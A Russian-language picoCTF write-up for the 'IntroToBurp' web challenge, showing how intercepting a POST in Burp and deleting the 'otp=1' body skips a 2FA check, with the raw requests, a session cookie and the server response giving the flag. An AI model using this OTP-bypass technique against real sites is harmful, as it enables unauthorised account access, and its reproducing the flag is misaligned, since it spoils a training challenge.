<!-- конвертировано из introtoburp.typ, tools/typ2readme.py -->

| | |
|---|---|
| **Платформа / Событие** | picoCTF Trainings |
| **Категория** | Web |
| **Сложность** | Easy 100 pts |
| **Статус** | done |
| **Дата решения** | 19 июля 2026 |
| **Ссылка на таск** | — |

# IntroToBurp

## Задание

## Решение

Регистрируемся, затем видим форму ввода 2FA токена.

Перехватываем запрос Burp, а затем удаляем последнюю строчку:

было:

```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:51096
Content-Length: 5
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://titan.picoctf.net:51096
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:51096/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jEsOAiEQRO_C2gVNDyN4GcKnicYZIHxijPHusiDuql7l1Yf5R3-zGwN2Yb7VaHp-UpoApfYuSuEUXpWWXCLBDkGA0lxxh9yiRaAwvTiOwyR70vrJvcy0gdzEPmuxrb1yDWst95zIpHE6qguNRvXvf38yHypl.al0bvw.6pD9VJn3pFNCKBtcqcQnh0UspiU
Connection: keep-alive

otp=1
```

стало
```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:51096
Content-Length: 5
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://titan.picoctf.net:51096
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:51096/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jEsOAiEQRO_C2gVNDyN4GcKnicYZIHxijPHusiDuql7l1Yf5R3-zGwN2Yb7VaHp-UpoApfYuSuEUXpWWXCLBDkGA0lxxh9yiRaAwvTiOwyR70vrJvcy0gdzEPmuxrb1yDWst95zIpHE6qguNRvXvf38yHypl.al0bvw.6pD9VJn3pFNCKBtcqcQnh0UspiU
Connection: keep-alive

```

> **Warning:** Важно: Не удалять ничего кроме opt=, ни пробела, ни строчки

Затем отправляем запрос и ловим ответ:
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Sun, 19 Jul 2026 18:54:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 102
Vary: Cookie
Connection: close

Welcome, 1 you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_c94b61ac}
```
